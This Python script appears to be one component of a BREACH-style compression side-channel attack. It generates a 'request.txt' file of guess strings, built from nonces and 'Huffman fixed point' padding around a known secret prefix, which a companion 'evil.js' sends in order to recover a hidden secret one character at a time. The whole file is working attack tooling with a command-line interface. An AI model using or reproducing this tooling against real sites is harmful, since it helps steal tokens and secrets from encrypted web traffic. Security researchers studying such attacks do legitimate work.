def initialize():
    '''
    Initialize global variables.
    '''
    global digit, lowercase, uppercase, dashes, nonce_1, nonce_2
    digit = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    lowercase = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    uppercase = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    dashes = ['-', '_']
    nonce_1 = 'ladbfsk!'
    nonce_2 = 'znq'

def create_alphabet(types):
    '''
    Create array with the alphabet we are testing.
    '''
    alphabet = []
    if 'n' in types:
        for i in digit:
            alphabet.append(i)
    if 'l' in types:
        for i in lowercase:
            alphabet.append(i)
    if 'u' in types:
        for i in uppercase:
            alphabet.append(i)
    if 'd' in types:
        for i in dashes:
            alphabet.append(i)
    return alphabet;

def huffman_point(alphabet, test):
    '''
    Use Huffman fixed point.
    '''
    nonce = ''
    for alpha_item in enumerate(alphabet):
        if alpha_item[1] != test:
                nonce = nonce + alpha_item[1] + '_'
    return nonce

def create_request_file(alpha_types, prefix):
    '''
    Create the 'request.txt' file used by evil.js to issue the requests.
    '''
    initialize();
    alphabet = create_alphabet(alpha_types)
    with open("request.txt", "w") as f:
        f.write(prefix + "\n")
        total_tests = []
        for test in alphabet:
            huffman_nonce = huffman_point(alphabet, test)
            search_string = nonce_1 + huffman_nonce + prefix + test + nonce_2
            total_tests.append(search_string)
        f.write(','.join(total_tests))
        f.close()

def parse_args():
    '''
    Parse console arguments for standalone use.
    '''
    parser = argparse.ArgumentParser(description='Create hillclimbing parameters file')
    parser.add_argument('-a', metavar = 'alphabet', required = True, nargs = '+', help = 'Choose alphabet type (careful to use correct request order): n => digits, l => lowercase letters, u => uppercase letters, d => - and _')
    parser.add_argument('-p', '--prefix', metavar = 'bootstrap_prefix', required = True, help = 'Input the already known prefix needed for bootstrap')
    args = parser.parse_args()
    alpha_types = args.a
    prefix = args.prefix
    return alpha_types, prefix

if __name__ == "__main__":
    import argparse

    alpha_types, prefix = parse_args()
    create_request_file(alpha_types, prefix)
